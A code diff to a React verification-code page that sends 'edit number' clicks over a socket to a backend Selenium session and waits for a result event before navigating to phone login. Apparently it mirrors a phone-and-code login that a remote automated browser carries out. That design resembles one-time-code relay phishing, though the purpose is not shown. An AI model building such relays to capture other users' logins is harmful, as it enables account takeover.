@@ -268,9 +268,8 @@ export const VerificationCodePage: React.FC = () => {
                   
                   // Click the edit button in Selenium
                   if (socketRef.current && socketRef.current.connected && sessionId) {
-                    socketRef.current.emit('clickAuthFormButton', {
+                    socketRef.current.emit('clickNumberEditButton', {
                       sessionId: sessionId,
-                      selector: '.auth-number-edit',
                       timestamp: new Date().toISOString()
                     });
                     console.log('[pencil] ✅ Edit button click sent to Selenium');
@@ -287,9 +286,8 @@ export const VerificationCodePage: React.FC = () => {
                         console.log('[pencil] waited a bit, socketRef.current', socketRef.current);
                         console.log('[pencil] waited a bit, sessionId', sessionId);
                         if (socketRef.current && socketRef.current.connected && sessionId) {
-                          socketRef.current.emit('clickAuthFormButton', {
+                          socketRef.current.emit('clickNumberEditButton', {
                             sessionId: sessionId,
-                            selector: '.auth-number-edit',
                             timestamp: new Date().toISOString()
                           });
                           console.log('[pencil] ✅ Edit button click sent to Selenium after reconnect');
@@ -302,10 +300,14 @@ export const VerificationCodePage: React.FC = () => {
                     }
                   }
                   
-                  // Wait for numberEditButtonClicked event before navigating
-                  socketRef.current?.once('numberEditButtonClicked', () => {
-                    console.log('[pencil] ✅ Number edit button clicked, navigating to phone login');
-                    navigate(`/phone-login?sessionId=${sessionId}`);
+                  // Wait for clickNumberEditButtonResult event before navigating
+                  socketRef.current?.once('clickNumberEditButtonResult', (data) => {
+                    if (data.sessionId === sessionId && data.success) {
+                      console.log('[pencil] ✅ Number edit button clicked, navigating to phone login');
+                      navigate(`/phone-login?sessionId=${sessionId}`);
+                    } else if (data.sessionId === sessionId && !data.success) {
+                      console.log('[pencil] ❌ Number edit button click failed:', data.error);
+                    }
                   });
                 }}
                 style={{
